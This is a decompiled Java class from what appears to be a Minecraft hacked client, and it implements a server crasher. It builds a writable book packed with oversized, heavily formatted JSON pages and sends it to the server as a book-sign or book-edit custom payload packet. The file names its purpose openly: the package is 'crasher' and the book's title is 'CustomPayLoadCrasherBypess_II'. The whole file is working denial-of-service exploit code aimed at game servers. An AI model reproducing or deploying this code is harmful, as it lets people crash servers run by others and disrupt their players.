// 
// Decompiled by Procyon v0.6.0
// 

package me.amkgre.bettercraft.client.mods.crasher.cpc;

import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketCustomPayload;
import net.minecraft.network.PacketBuffer;
import io.netty.buffer.Unpooled;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.client.Minecraft;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.item.ItemStack;
import net.minecraft.init.Items;

public class CustomPayloadCrasher14
{
    public static void start() {
        boolean switching = false;
        final ItemStack bookStack = new ItemStack(Items.WRITABLE_BOOK);
        final NBTTagCompound nbtTagCompound;
        final NBTTagCompound bookCompound = nbtTagCompound = new NBTTagCompound();
        final String key = "author";
        Minecraft.getMinecraft();
        nbtTagCompound.setString(key, Minecraft.getSession().getUsername());
        bookCompound.setString("title", "CustomPayLoadCrasherBypess_II");
        final NBTTagList pageList = new NBTTagList();
        final String pageText = "123456789";
        for (int page = 0; page < 7; ++page) {
            pageList.appendTag(new NBTTagString("{\"bold\":true,\"italic\":true,\"underlined\":true,\"strikethrough\":true,\"obfuscated\":true,\"text\":\"t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5\"}"));
        }
        bookCompound.setTag("pages", pageList);
        bookStack.setTagCompound(bookCompound);
        final PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());
        packetBuffer.writeItemStackToBuffer(bookStack);
        if (!switching) {
            Minecraft.getMinecraft().player.connection.sendPacket(new CPacketCustomPayload("MC|BSign", packetBuffer));
            switching = true;
        }
        else {
            Minecraft.getMinecraft().player.connection.sendPacket(new CPacketCustomPayload("MC|BEdit", packetBuffer));
        }
    }
}
